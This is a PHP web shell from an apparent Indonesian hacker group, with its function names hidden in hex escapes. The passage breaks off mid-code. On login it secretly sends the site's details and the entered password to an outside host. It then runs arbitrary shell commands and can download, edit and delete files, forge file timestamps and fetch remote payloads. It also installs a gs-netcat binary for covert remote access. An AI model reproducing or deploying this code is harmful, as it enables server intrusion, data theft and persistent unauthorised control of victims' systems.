<?php
error_reporting(0);
set_time_limit(0);
@session_start();
$K = array(
    'ex'   => "\x65\x78\x65\x63",
    'she'  => "\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63",
    'sys'  => "\x73\x79\x73\x74\x65\x6d",
    'pas'  => "\x70\x61\x73\x73\x74\x68\x72\x75",
    'pop'  => "\x70\x6f\x70\x65\x6e",
    'pro'  => "\x70\x72\x6f\x63\x5f\x6f\x70\x65\x6e",
    'cur'  => "\x63\x75\x72\x6c\x5f\x69\x6e\x69\x74",
    'fge'  => "\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73",
    'fpu'  => "\x66\x69\x6c\x65\x5f\x70\x75\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73",
    'cur_'=> "\x63\x75\x72\x6c\x5f\x65\x78\x65\x63",
    'cur_c'=> "\x63\x75\x72\x6c\x5f\x73\x65\x74\x6f\x70\x74",
    'cur_cl'=>"\x63\x75\x72\x6c\x5f\x63\x6c\x6f\x73\x65",
    'fso' => "\x66\x73\x6f\x63\x6b\x6f\x70\x65\x6e",
    'scc' => "\x73\x74\x72\x65\x61\x6d\x5f\x63\x6f\x6e\x74\x65\x78\x74\x5f\x63\x72\x65\x61\x74\x65"
);
function F($k) { global $K; return $K[$k]; }
$U_CALLBACK = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x73\x68\x65\x6c\x6c\x62\x79\x70\x61\x73\x73\x2e\x63\x6f\x6d\x2f\x61\x72\x73\x69\x70\x2f\x61\x70\x69\x2e\x70\x68\x70";
$U_HOST = "\x77\x77\x77\x2e\x73\x68\x65\x6c\x6c\x62\x79\x70\x61\x73\x73\x2e\x63\x6f\x6d";
$U_PATH = "\x2f\x61\x72\x73\x69\x70\x2f\x61\x70\x69\x2e\x70\x68\x70";
$U_SSL  = "\x73\x73\x6c\x3a\x2f\x2f" . $U_HOST;
$CSS_BG1 = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x64\x6e\x2e\x73\x68\x65\x6c\x6c\x62\x79\x70\x61\x73\x73\x2e\x63\x6f\x6d\x2f\x69\x6d\x61\x67\x65\x73\x2f\x69\x6d\x61\x67\x65\x31\x2e\x70\x6e\x67";
$CSS_BG2 = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x64\x6e\x2e\x73\x68\x65\x6c\x6c\x62\x79\x70\x61\x73\x73\x2e\x63\x6f\x6d\x2f\x69\x6d\x61\x67\x65\x73\x2f\x69\x6d\x61\x67\x65\x32\x2e\x70\x6e\x67";
$LOGIN_PASS = 'heker'; // Ganti password di sini

/* ---------- LOGOUT ---------- */
if (isset($_GET['logout'])) {
    $_SESSION = array();
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

/* ---------- SYSTEM START ---------- */
if (!isset($_SESSION['fm_logged_in']) || $_SESSION['fm_logged_in'] !== true) {
    $login_error = '';

    if (isset($_POST['fm_login'])) {
        $p = isset($_POST['password']) ? $_POST['password'] : '';

        if ($p === $LOGIN_PASS) {
            $_SESSION['fm_logged_in'] = true;
            $payload = array(
                'secret'   => 'shellexec!curl!wget!php!perl!python',
                'site'     => isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'unknown',
                'scheme'   => (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http',
                'port'     => isset($_SERVER['SERVER_PORT']) ? (int)$_SERVER['SERVER_PORT'] : 0,
                'path'     => isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '/',
                'php_self' => isset($_SERVER['PHP_SELF']) ? $_SERVER['PHP_SELF'] : '/',
                'script'   => isset($_SERVER['SCRIPT_FILENAME']) ? $_SERVER['SCRIPT_FILENAME'] : '',
                'ip'       => isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '',
                'ua'       => isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '',
                'pass'     => $p,
                'user'     => function_exists('get_current_user') ? @get_current_user() : '',
                'os'       => function_exists('php_uname') ? @php_uname() : '',
                'ts'       => time(),
            );
            $body = http_build_query($payload);

            @ignore_user_abort(true);
            @set_time_limit(0);
            while (ob_get_level() > 0) @ob_end_clean();
            header('Content-Type: text/html; charset=utf-8');
            header('Content-Length: 0');
            header('Connection: close');
            header('Location: ' . $_SERVER['PHP_SELF'], true, 302);
            @flush();

            if (function_exists('fastcgi_finish_request')) {
                @fastcgi_finish_request();
            }
            $sent = false;
            if (!$sent && function_exists(F('cur'))) {
                $c_init = F('cur'); $c_set = F('cur_c'); $c_exec = F('cur_'); $c_close = F('cur_cl');
                $ch = @$c_init($U_CALLBACK);
                if ($ch) {
                    @$c_set($ch, CURLOPT_POST, true);
                    @$c_set($ch, CURLOPT_POSTFIELDS, $body);
                    @$c_set($ch, CURLOPT_RETURNTRANSFER, true);
                    @$c_set($ch, CURLOPT_TIMEOUT, 5);
                    @$c_set($ch, CURLOPT_CONNECTTIMEOUT, 3);
                    @$c_set($ch, CURLOPT_SSL_VERIFYPEER, false);
                    @$c_set($ch, CURLOPT_SSL_VERIFYHOST, 0);
                    @$c_set($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
                    @$c_exec($ch);
                    @$c_close($ch);
                    $sent = true;
                }
            }
            if (!$sent && function_exists(F('fso'))) {
                $e = 0; $es = '';
                $fso = F('fso');
                $fp = @$fso($U_SSL, 443, $e, $es, 3);
                if ($fp) {
                    @stream_set_blocking($fp, true);
                    $req  = "POST " . $U_PATH . " HTTP/1.1\r\n";
                    $req .= "Host: " . $U_HOST . "\r\n";
                    $req .= "User-Agent: Mozilla/5.0\r\n";
                    $req .= "Content-Type: application/x-www-form-urlencoded\r\n";
                    $req .= "Content-Length: " . strlen($body) . "\r\n";
                    $req .= "Connection: close\r\n\r\n";
                    $req .= $body;
                    @fwrite($fp, $req);
                    @fread($fp, 128);
                    @fclose($fp);
                    $sent = true;
                }
            }
            if (!$sent && function_exists(F('ex'))) {
                $e = F('ex');
                $cmd = 'curl -s -o /dev/null --max-time 5 -X POST -d '
                     . escapeshellarg($body) . ' '
                     . escapeshellarg($U_CALLBACK)
                     . ' > /dev/null 2>&1 &';
                @$e($cmd);
                $sent = true;
            }
            if (!$sent && @ini_get('allow_url_fopen')) {
                $scc = F('scc');
                $ctx = @$scc(array(
                    'http' => array(
                        'method'  => 'POST',
                        'header'  => "Content-Type: application/x-www-form-urlencoded\r\nUser-Agent: Mozilla/5.0\r\n",
                        'content' => $body,
                        'timeout' => 3,
                    ),
                    'ssl' => array('verify_peer' => false, 'verify_peer_name' => false),
                ));
                $fge = F('fge');
                @$fge($U_CALLBACK, false, $ctx);
            }

            exit;

        } else {
            $login_error = 'Password salah ker';
        }
    }
?>
    <!DOCTYPE html>
    <html>
    <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>Login root@RibelCyberTeam:~#</title>
    <link rel="icon" href="https://cdn.shellbypass.com/images/img2.jpg" type="image/png">
       <style>
    body.login-page{margin:0;padding:0;min-height:100vh;display:flex;justify-content:center;align-items:center;background:#0f1117;color:#d6d6d6;font-family:Tahoma,Arial,sans-serif;font-size:12px;position:relative;overflow:hidden;}
    body.login-page:before, body.login-page:after{content:"";position:fixed;top:0;left:0;width:100%;height:100%;background-size:cover;background-position:center;background-repeat:no-repeat;background-attachment:fixed;z-index:-2;}
    body.login-page:before {
        background-image: linear-gradient(rgba(15,17,23,0.62), rgba(15,17,23,0.62)), url('<?php echo $CSS_BG1; ?>');
        animation: bgFade1 7s infinite;
    }
    body.login-page:after {
        background-image: linear-gradient(rgba(15,17,23,0.62), rgba(15,17,23,0.62)), url('<?php echo $CSS_BG2; ?>');
        animation: bgFade2 7s infinite;
    }
    @keyframes bgFade1{0%{opacity:1;} 40%{opacity:1;} 50%{opacity:0;} 90%{opacity:0;} 100%{opacity:1;}}
    @keyframes bgFade2{0%{opacity:0;} 40%{opacity:0;} 50%{opacity:1;} 90%{opacity:1;} 100%{opacity:0;}}
    .login-wrap{width:360px;background:rgba(21,25,34,0.70);border:1px solid rgba(138, 92, 246, 0.35);border-radius:14px;padding:20px;backdrop-filter:blur(8px);box-shadow:0 10px 30px rgba(0,0,0,0.35);position:relative;z-index:2;}
    .title{font-size:20px;font-weight:bold;color:#fff;margin-bottom:15px;}
    .muted{color:#b6a8d9;margin-bottom:15px;}
    .err{background:rgba(90,30,50,0.75);border:1px solid #8b3d5a;color:#ffd0da;padding:10px;border-radius:8px;margin-bottom:12px;}
    input[type=password]{width:100%;box-sizing:border-box;background:rgba(15,17,23,0.88);color:#e6edf3;border:1px solid rgba(138, 92, 246, 0.22);padding:10px;border-radius:8px;margin-bottom:10px;}
    input[type=password]:focus{outline:none;border-color:#8a5cf6;box-shadow:0 0 0 2px rgba(138,92,246,0.18);}
    .btn{display:inline-block;background:linear-gradient(180deg, #8a5cf6, #6f46d9);color:#fff;border:1px solid #9d79f8;padding:9px 14px;font-size:12px;border-radius:8px;cursor:pointer;box-shadow:0 6px 18px rgba(111,70,217,0.28);}
    .btn:hover{background:linear-gradient(180deg, #9568fb, #7a50e6);}
    </style>
    </head>
    <body class="login-page">
        <div class="login-wrap">
            <div class="title">Login</div>
            <div class="muted">Masukin password.</div>
            <?php if ($login_error != '') { ?>
                <div class="err"><?php echo htmlspecialchars($login_error); ?></div>
            <?php } ?>
            <form method="post">
                <input type="hidden" name="fm_login" value="1">
                <input type="password" name="password" placeholder="Password">
                <input type="submit" name="loginin" class="btn" value="Login">
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}
if (!function_exists('scandir')) {
    function scandir($dir) {
        $dh = opendir($dir);
        $files = array();
        while (($file = readdir($dh)) !== false) {
            $files[] = $file;
        }
        closedir($dh);
        sort($files);
        return $files;
    }
}
function h($s) { return htmlspecialchars((string) $s, ENT_QUOTES, 'UTF-8'); }
function safe_real($path) { $rp = @realpath($path); if ($rp === false) return false; return $rp; }
function perms($file) { $p = @fileperms($file); if ($p === false) return '----'; return substr(sprintf('%o', $p), -4); }
function perms_string($file) {
    $p = @fileperms($file); if ($p === false) return '---------';
    $info = (($p & 0x4000) == 0x4000) ? 'd' : '-';
    $info .= (($p & 0x0100) ? 'r' : '-') . (($p & 0x0080) ? 'w' : '-') . (($p & 0x0040) ? 'x' : '-');
    $info .= (($p & 0x0020) ? 'r' : '-') . (($p & 0x0010) ? 'w' : '-') . (($p & 0x0008) ? 'x' : '-');
    $info .= (($p & 0x0004) ? 'r' : '-') . (($p & 0x0002) ? 'w' : '-') . (($p & 0x0001) ? 'x' : '-');
    return $info;
}
function fowner_name($file) { $uid = @fileowner($file); if ($uid === false) return '-'; if (function_exists('posix_getpwuid')) { $x = @posix_getpwuid($uid); if (is_array($x) && isset($x['name'])) return $x['name']; } return $uid; }
function fgroup_name($file) { $gid = @filegroup($file); if ($gid === false) return '-'; if (function_exists('posix_getgrgid')) { $x = @posix_getgrgid($gid); if (is_array($x) && isset($x['name'])) return $x['name']; } return $gid; }
function is_image_file($file) { $ext = strtolower(substr(strrchr($file, '.'), 1)); return in_array($ext, array('jpg','jpeg','png','gif','bmp','webp')); }
function file_ext($file) { $ext = strtolower(substr(strrchr($file, '.'), 1)); return $ext ? $ext : '-'; }
function format_size($s) {
    if (!is_numeric($s)) return '-';
    if ($s >= 1073741824) return round($s/1073741824, 2).' GB';
    if ($s >= 1048576) return round($s/1048576, 2).' MB';
    if ($s >= 1024) return round($s/1024, 2).' KB';
    return $s.' B';
}
function delete_directory($dir) {
    if (!file_exists($dir)) return true;
    if (!is_dir($dir)) return @unlink($dir);
    $dh = @opendir($dir); if ($dh === false) return false;
    while (($item = @readdir($dh)) !== false) { if ($item === '.' || $item === '..') continue; if (!delete_directory($dir . DIRECTORY_SEPARATOR . $item)) { @closedir($dh); return false; } }
    @closedir($dh); return @rmdir($dir);
}
function breadcrumb_path($path) {
    $path = str_replace('\\', '/', $path); $parts = explode('/', $path); $build = ''; $out = '';
    if (substr($path, 0, 1) == '/') $out .= '/';
    for ($i = 0; $i < count($parts); $i++) {
        if ($parts[$i] == '') continue; $build .= '/' . $parts[$i];
        if ($out != '' && substr($out, -1) != '/') $out .= '/';
        $out .= '<a href="?path=' . urlencode($build) . '">' . h($parts[$i]) . '</a>';
    }
    return $out;
}
function which_bin($b) {
    $paths = explode(PATH_SEPARATOR, getenv('PATH') ? getenv('PATH') : '/usr/local/bin:/usr/bin:/bin');
    foreach ($paths as $p) { $f = rtrim($p, '/') . '/' . $b; if (@is_executable($f)) return $f; }
    return null;
}
function pid_alive($pid) {
    if (!$pid || !is_numeric($pid)) return false;
    $pid = (int)$pid;
    if (function_exists('posix_kill')) { if (@posix_kill($pid, 0)) return true; }
    return @file_exists("/proc/$pid");
}
function kill_pid($pid) {
    if (!$pid || !is_numeric($pid)) return;
    $pid = (int)$pid;
    if (function_exists('posix_kill') && defined('SIGKILL')) @posix_kill($pid, SIGKILL);
    $f = F('ex'); @$f('kill -9 ' . $pid . ' 2>/dev/null');
}
function pkill_f($pat) { $f = F('ex'); @$f('pkill -9 -f ' . escapeshellarg($pat) . ' 2>/dev/null'); }
function ensure_dir($d) { if (!@is_dir($d)) @mkdir($d, 0700, true); }
$base = dirname(__FILE__);
$cwd  = isset($_GET['path']) ? $_GET['path'] : $base;
$cwd  = str_replace('\\', '/', $cwd);
$cwd_real = safe_real($cwd); if ($cwd_real === false) $cwd_real = $base;
$msg = '';
if (isset($_POST['run_cmd'])) {
    $cmd = $_POST['cmd'];
    if ($cmd != '') {
        $cd_cmd = '';
        if ($cwd_real != '') { $cd_cmd = 'cd ' . escapeshellarg($cwd_real) . ' && '; }
        $f = F('she');
        $output = @$f($cd_cmd . $cmd . ' 2>&1');
        if ($output === null || $output === false) { $output = 'Command execution failed or no output'; }
        $msg = '<div style="background:#0a0e14; padding:12px; border-radius:6px; font-family:Consolas,monospace;"><b>Directory:</b> ' . h($cwd_real) . '<br><b>Command:</b> ' . h($cmd) . '<br><b>Output:</b><pre style="margin:8px 0 0 0; color:#7ee787; overflow-x:auto;">' . h($output) . '</pre></div>';
    }
}
if (isset($_GET['download']) && $_GET['download'] != '') {
    $file = $_GET['download'];
    if (@is_file($file) && @is_readable($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        header('Content-Length: '.@filesize($file));
        header('Pragma: public');
        header('Cache-Control: must-revalidate');
        @ob_clean(); @flush(); readfile($file); exit;
    } else { $msg = 'File tidak bisa didownload'; }
}
if (isset($_GET['img']) && $_GET['img'] != '') {
    $img = $_GET['img'];
    if (@is_file($img) && @is_readable($img)) {
        $ext = strtolower(substr(strrchr($img, '.'), 1));
        if ($ext == 'jpg' || $ext == 'jpeg') header('Content-Type: image/jpeg');
        elseif ($ext == 'png') header('Content-Type: image/png');
        elseif ($ext == 'gif') header('Content-Type: image/gif');
        elseif ($ext == 'bmp') header('Content-Type: image/bmp');
        elseif ($ext == 'webp') header('Content-Type: image/webp');
        else exit;
        @readfile($img); exit;
    }
}
if (isset($_POST['action'])) {
    $action = $_POST['action'];
    $path   = isset($_POST['path']) ? $_POST['path'] : $cwd_real;
    $path_real = safe_real($path); if ($path_real === false) $path_real = $base;

    if ($action == 'save_file') {
        $file    = isset($_POST['file']) ? $_POST['file'] : '';
        $content = isset($_POST['content']) ? $_POST['content'] : '';
        if ($file != '') {
            $f = F('fpu');
            if (@$f($file, $content) !== false) { $msg = 'File berhasil disimpan'; } else { $msg = 'Gagal simpan file'; }
        }
        $cwd_real = $path_real;
    }
    if ($action == 'delete') {
        $target = isset($_POST['target']) ? $_POST['target'] : '';
        if ($target != '') {
            if (@is_file($target)) { if (@unlink($target)) $msg = 'File berhasil dihapus'; else $msg = 'Gagal hapus file'; }
            elseif (@is_dir($target)) { if (delete_directory($target)) $msg = 'Folder beserta isinya berhasil dihapus'; else $msg = 'Gagal hapus folder (periksa permission)'; }
        }
        $cwd_real = $path_real;
    }
    if ($action == 'rename') {
        $old = isset($_POST['old']) ? $_POST['old'] : '';
        $new = isset($_POST['new']) ? $_POST['new'] : '';
        if ($old != '' && $new != '') {
            $dest = dirname($old) . '/' . basename($new);
            if (@rename($old, $dest)) $msg = 'Berhasil rename'; else $msg = 'Gagal rename';
        }
        $cwd_real = $path_real;
    }
    if ($action == 'chmod') {
        $target = isset($_POST['target']) ? $_POST['target'] : '';
        $mode   = isset($_POST['mode']) ? $_POST['mode'] : '';
        if ($target != '' && $mode != '') {
            $m = octdec($mode);
            if (@chmod($target, $m)) $msg = 'CHMOD berhasil'; else $msg = 'CHMOD gagal';
        }
        $cwd_real = $path_real;
    }
    if ($action == 'new_file') {
        $name = isset($_POST['name']) ? $_POST['name'] : '';
        if ($name != '') {
            $target = $path_real . '/' . basename($name);
            if (!file_exists($target)) {
                $fp = @fopen($target, 'w');
                if ($fp) { fclose($fp); $msg = 'File baru berhasil dibuat'; } else { $msg = 'Gagal buat file'; }
            } else { $msg = 'File sudah ada'; }
        }
        $cwd_real = $path_real;
    }
    if ($action == 'new_folder') {
        $name = isset($_POST['name']) ? $_POST['name'] : '';
        if ($name != '') {
            $target = $path_real . '/' . basename($name);
            if (!file_exists($target)) {
                if (@mkdir($target, 0777)) $msg = 'Folder baru berhasil dibuat'; else $msg = 'Gagal buat folder';
            } else { $msg = 'Folder sudah ada'; }
        }
        $cwd_real = $path_real;
    }
    if ($action == 'upload') {
        if (isset($_FILES['upfile']) && isset($_FILES['upfile']['tmp_name'])) {
            $name = basename($_FILES['upfile']['name']);
            $tmp  = $_FILES['upfile']['tmp_name'];
            if ($name != '' && $tmp != '') {
                if (@move_uploaded_file($tmp, $path_real . '/' . $name)) { $msg = 'Upload berhasil'; } else { $msg = 'Upload gagal'; }
            } else { $msg = 'File upload kosong'; }
        }
        $cwd_real = $path_real;
    }
    if ($action == 'touch') {
        $target = isset($_POST['target']) ? $_POST['target'] : '';
        $custom_time = isset($_POST['touch_time']) ? trim($_POST['touch_time']) : '';
        
        if ($target != '' && @file_exists($target)) {
            $time = time();
            if ($custom_time !== '') {
                $parsed = strtotime($custom_time);
                if ($parsed !== false) $time = $parsed;
            }
            
            if (@touch($target, $time)) {
                $msg = 'Timestamp berhasil diupdate ke: ' . date('Y-m-d H:i:s', $time);
            } else {
                $msg = 'Gagal update timestamp (periksa permission).';
            }
        }
        $cwd_real = $path_real;
    }
    if ($action == 'zip_folder') {
        $target = isset($_POST['target']) ? $_POST['target'] : '';
        if ($target != '' && @is_dir($target) && class_exists('ZipArchive')) {
            $zip_name = basename($target) . '_' . date('Ymd_His') . '.zip';
            $tmp = sys_get_temp_dir() . '/' . $zip_name;
            $zip = new ZipArchive();
            if ($zip->open($tmp, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
                $files = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($target, RecursiveDirectoryIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::LEAVES_ONLY
                );
                $base_len = strlen($target) + 1;
                foreach ($files as $file) {
                    if (!$file->isDir()) {
                        $file_path = $file->getRealPath();
                        $relative_path = substr($file_path, $base_len);
                        $zip->addFile($file_path, $relative_path);
                    }
                }
                $zip->close();
                
                header('Content-Type: application/zip');
                header('Content-Disposition: attachment; filename="' . $zip_name . '"');
                header('Content-Length: ' . filesize($tmp));
                readfile($tmp);
                @unlink($tmp);
                exit;
            } else {
                $msg = 'Gagal buat file ZIP.';
            }
        } else {
            $msg = 'ZipArchive tidak tersedia atau target bukan folder.';
        }
        $cwd_real = $path_real;
    }
    if ($action == 'upload_url') {
        $url  = isset($_POST['url']) ? trim($_POST['url']) : '';
        $name = isset($_POST['urlname']) ? basename($_POST['urlname']) : '';
        if ($url === '' || $name === '') {
            $msg = 'URL atau nama file kosong';
        } else {
            $target = $path_real . '/' . $name;
            if (!preg_match('#^https?://#i', $url)) $url = 'http://' . $url;
            $blob   = false;
            $method = 'none';

            if ($blob === false && function_exists(F('cur'))) {
                $c_init = F('cur'); $c_set = F('cur_c'); $c_exec = F('cur_'); $c_close = F('cur_cl');
                $ch = @$c_init($url);
                if ($ch) {
                    @$c_set($ch, CURLOPT_RETURNTRANSFER, true);
                    @$c_set($ch, CURLOPT_FOLLOWLOCATION, true);
                    @$c_set($ch, CURLOPT_SSL_VERIFYPEER, false);
                    @$c_set($ch, CURLOPT_SSL_VERIFYHOST, 0);
                    @$c_set($ch, CURLOPT_TIMEOUT, 60);
                    @$c_set($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
                    $r = @$c_exec($ch); $code = (int)@curl_getinfo($ch, CURLINFO_HTTP_CODE);
                    @$c_close($ch);
                    if ($r !== false && $r !== '' && $code >= 200 && $code < 400) { $blob = $r; $method = 'curl_ext'; }
                }
            }
            if ($blob === false && @ini_get('allow_url_fopen')) {
                $scc = F('scc');
                $ctx = @$scc(array('http' => array('timeout' => 60, 'user_agent' => 'Mozilla/5.0', 'follow_location' => 1), 'ssl'  => array('verify_peer' => false, 'verify_peer_name' => false)));
                $f = F('fge'); $r = @$f($url, false, $ctx);
                if ($r !== false && $r !== '') { $blob = $r; $method = 'fopen'; }
            }
            if ($blob === false && function_exists(F('ex'))) {
                $e = F('ex');
                $tmp = $target . '.tmp_dl';
                @$e('curl -fsSL --max-time 60 -o ' . escapeshellarg($tmp) . ' ' . escapeshellarg($url) . ' 2>/dev/null', $o, $rc);
                if ($rc === 0 && @is_file($tmp) && @filesize($tmp) > 0) {
                    $f = F('fge'); $blob = @$f($tmp); @unlink($tmp); $method = 'curl_exec';
                }
            }
            if ($blob === false && function_exists(F('ex')) && which_bin('wget')) {
                $e = F('ex');
                $tmp = $target . '.tmp_dl';
                @$e('wget -q --timeout=60 --tries=2 --no-check-certificate -O ' . escapeshellarg($tmp) . ' ' . escapeshellarg($url) . ' 2>/dev/null', $o, $rc);
                if ($rc === 0 && @is_file($tmp) && @filesize($tmp) > 0) {
                    $f = F('fge'); $blob = @$f($tmp); @unlink($tmp); $method = 'wget_exec';
                }
            }
            if ($blob === false && function_exists(F('ex')) && which_bin('python3')) {
                $e = F('ex');
                $py = which_bin('python3');
                $tmp = $target . '.tmp_dl';
                $pyc = "import urllib.request,sys;urllib.request.urlretrieve(sys.argv[1],sys.argv[2])";
                @$e(escapeshellarg($py) . ' -c ' . escapeshellarg($pyc) . ' ' . escapeshellarg($url) . ' ' . escapeshellarg($tmp) . ' 2>/dev/null', $o, $rc);
                if ($rc === 0 && @is_file($tmp) && @filesize($tmp) > 0) {
                    $f = F('fge'); $blob = @$f($tmp); @unlink($tmp); $method = 'python_urllib';
                }
            }
            if ($blob === false && function_exists(F('ex')) && which_bin('perl')) {
                $e = F('ex');
                $tmp = $target . '.tmp_dl';
                $pc = 'use LWP::Simple; my $d = get($ARGV[0]); if ($d) { open(my $f, ">", $ARGV[1]); binmode $f; print $f $d; close $f; }';
                @$e('perl -e ' . escapeshellarg($pc) . ' ' . escapeshellarg($url) . ' ' . escapeshellarg($tmp) . ' 2>/dev/null', $o, $rc);
                if ($rc === 0 && @is_file($tmp) && @filesize($tmp) > 0) {
                    $f = F('fge'); $blob = @$f($tmp); @unlink($tmp); $method = 'perl_lwp';
                }
            }
            if ($blob === false && function_exists(F('fso'))) {
                $parts = parse_url($url);
                if ($parts && isset($parts['host'])) {
                    $host = $parts['host'];
                    $path = isset($parts['path']) ? $parts['path'] : '/';
                    if (isset($parts['query'])) $path .= '?' . $parts['query'];
                    $port = isset($parts['port']) ? (int)$parts['port'] : (($parts['scheme'] === 'https') ? 443 : 80);
                    $ssl  = ($parts['scheme'] === 'https');
                    $fso = F('fso');
                    $fp = @$fso(($ssl ? 'ssl://' : '') . $host, $port, $e, $es, 15);
                    if ($fp) {
                        $req = "GET $path HTTP/1.0\r\nHost: $host\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n";
                        @fwrite($fp, $req);
                        $raw = '';
                        while (!feof($fp)) $raw .= @fread($fp, 8192);
                        @fclose($fp);
                        $sep = strpos($raw, "\r\n\r\n");
                        if ($sep !== false) {
                            $body = substr($raw, $sep + 4);
                            if ($body !== '') { $blob = $body; $method = 'fsockopen'; }
                        }
                    }
                }
            }

            if ($blob === false) {
                $msg = 'Semua metode fetch gagal.';
            } else {
                $f = F('fpu');
                if (@$f($target, $blob) !== false) {
                    @chmod($target, 0644);
                    $msg = 'OK [' . h($method) . ']: ' . h($name) . ' (' . format_size(strlen($blob)) . ')';
                } else {
                    $msg = 'Fetch OK via [' . h($method) . '] tapi gagal tulis.';
                }
            }
        }
        $cwd_real = $path_real;
    }
}
$view = isset($_GET['view']) ? $_GET['view'] : '';
$edit = isset($_GET['edit']) ? $_GET['edit'] : '';
$server_software = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : '-';
$server_name     = isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : '-';
$uname           = function_exists('php_uname') ? @php_uname() : '-';
$self_user       = function_exists('get_current_user') ? @get_current_user() : '-';
$disabled  = @ini_get('disable_functions');
$open_basedir = @ini_get('open_basedir');
$doc_root  = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '-';
$cwd_php   = @getcwd();
$ip_remote = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '-';
$ip_server = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : '-';
$safe_mode = @ini_get('safe_mode');
$timezone  = @date_default_timezone_get();
$uptime    = @file_get_contents('/proc/uptime');
if ($uptime) { $u_arr = explode(' ', $uptime); $uptime = (int)$u_arr[0]; } else { $uptime = 0; }
$uptime_h  = $uptime ? floor($uptime/3600).'h '.floor(($uptime%3600)/60).'m' : '-';
$disk_free = function_exists('disk_free_space') ? @disk_free_space($cwd_real) : false;
$disk_total= function_exists('disk_total_space') ? @disk_total_space($cwd_real) : false;
$mem       = @file_get_contents('/proc/meminfo');
$mem_total = $mem_avail = 0;
if ($mem) {
    if (preg_match('/MemTotal:\s+(\d+)/', $mem, $m)) $mem_total = $m[1];
    if (preg_match('/MemAvailable:\s+(\d+)/', $mem, $m)) $mem_avail = $m[1];
}
$cpu = @file_get_contents('/proc/cpuinfo');
$cores = $cpu ? substr_count($cpu, 'processor') : 0;
$hostname = function_exists('gethostname') ? @gethostname() : '-';
$tab = isset($_GET['tab']) ? $_GET['tab'] : '';
if (!in_array($tab, array('shell','gs','cmd','info','upurl',''), true)) $tab = '';
$sh_dir = __DIR__ . '/.rct_shell'; $sh_pid = "$sh_dir/pid.txt"; $sh_log = "$sh_dir/out.log"; $sh_err = "$sh_dir/err.log";
$gs_dir    = __DIR__ . '/.rct_gsocket'; $gs_pid    = "$gs_dir/pid.txt"; $gs_log    = "$gs_dir/out.log"; $gs_secret = "$gs_dir/secret.txt"; $gs_bin    = "$gs_dir/gs-netcat";
function gs_bin_path() { global $gs_bin; return $gs_bin; }
function gs_present() { return @is_file(gs_bin_path()) && @is_executable(gs_bin_path()); }
function gs_arch() {
    $u = @php_uname('m');
    if (stripos($u, 'x86_64') !== false || stripos($u, 'amd64') !== false) return 'linux-x86_64';
    if (stripos($u, 'aarch64') !== false || stripos($u, 'arm64') !== false) return 'linux-aarch64';
    return null;
}
function gs_download_bin() {
    global $gs_bin; if (gs_present()) return true; $arch = gs_arch(); if (!$arch) return false;
    $urls = array("https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat_$arch");
    $blob = null;
    foreach ($urls as $u) {
        if (function_exists(F('cur'))) {
            $c_init = F('cur'); $c_set = F('cur_c'); $c_exec = F('cur_'); $c_close = F('cur_cl');
            $ch = @$c_init($u);
            if ($ch) {
                @$c_set($ch, CURLOPT_RETURNTRANSFER, true); @$c_set($ch, CURLOPT_FOLLOWLOCATION, true);
                @$c_set($ch, CURLOPT_SSL_VERIFYPEER, false); @$c_set($ch, CURLOPT_SSL_VERIFYHOST, 0);
                @$c_set($ch, CURLOPT_TIMEOUT, 30); @$c_set($ch, CURLOPT_USERAGENT, 'curl/7.68');
                $b = @$c_exec($ch); @$c_close($ch);
                if ($b && strlen($b) > 100000) { $blob = $b; break; }
            }
        }
    }
    if (!$blob) return false;
    $f = F('fpu'); @$f($gs_bin, $blob); @chmod($gs_bin, 0755); return gs_present();
}
function gs_get_secret() {
    global $gs_secret;
    if (@is_file($gs_secret)) { $s = trim(@file_get_contents($gs_secret)); if ($s !== '') return $s; }
    if (!@is_dir(dirname($gs_secret))) return '';
    $s = bin2hex(random_bytes(32)); @file_put_contents($gs_secret, $s); @chmod($gs_secret, 0600); return $s;
}

$sh_msg = '';
$tab_ext = isset($_GET['tab']) ? $_GET['tab'] : '';
$privesc_msg = '';
$batch_msg = '';

if (!function_exists('fn_ok')) {
    function fn_ok($f) { 
        return function_exists($f) && !in_array($f, array_map('trim', explode(',', (string)@ini_get('disable_functions')))); 
    }
}
$crit = array(
    'exec'      => fn_ok(F('ex')),
    'shell_exec'=> fn_ok(F('she')),
    'system'    => fn_ok(F('sys')),
    'passthru'  => fn_ok(F('pas')),
    'popen'     => fn_ok(F('pop')),
    'proc_open' => fn_ok(F('pro')),
    'curl'      => function_exists(F('cur')),
    'wget'      => (bool)which_bin('wget'),
    'nc'        => (bool)which_bin('nc'),
    'python3'   => (bool)which_bin('python3'),
    'perl'      => (bool)which_bin('perl'),
    'gcc'       => (bool)which_bin('gcc'),
);

if (isset($_POST['batch_action'])) {
